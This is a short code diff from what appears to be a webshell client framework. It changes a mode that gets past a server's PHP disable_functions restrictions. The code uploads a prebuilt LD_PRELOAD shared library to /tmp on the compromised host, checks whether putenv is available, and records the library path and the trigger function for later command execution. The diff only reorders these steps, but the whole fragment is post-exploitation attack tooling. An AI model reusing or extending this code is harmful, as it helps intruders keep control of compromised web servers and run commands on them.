@@ -37,20 +37,21 @@ def get_detectd_ext(extname: str):
 def set_mode(mode: int, test: bool = False):
     if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):
         disable_func_list = gget("webshell.disable_functions", "webshell")
-        filename = "/tmp/%s.so" % str(uuid4())
-        upload_result = upload(
-            path.join(getcwd(), "auxiliary", "ld_preload_x86_64.so"), filename, True)
-        if (not upload_result):
-            return
-        if ("putenv" in disable_func_list):
-            print(color.red("\nputenv is disabled.\n"))
-            return False
-        ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
-        if (not ld_preload_func):
-            print(color.red("\nNo ld_preload function!\n"))
-            return False
-        gset("webshell.ld_preload_path", filename, True, "webshell")
-        gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
+        if (not gget("webshell.ld_preload_path", "webshell", None)):
+            filename = "/tmp/%s.so" % str(uuid4())
+            ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
+            upload_result = upload(
+                path.join(getcwd(), "auxiliary", "ld_preload_x86_64.so"), filename, True)
+            if (not upload_result):
+                return
+            gset("webshell.ld_preload_path", filename, True, "webshell")
+            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
+            if ("putenv" in disable_func_list):
+                print(color.red("\nputenv is disabled.\n"))
+                return False
+            if (not ld_preload_func):
+                print(color.red("\nNo ld_preload function!\n"))
+                return False
     if (mode == 5):
         res = send(get_detectd_ext("FFI"))
         if (not res):
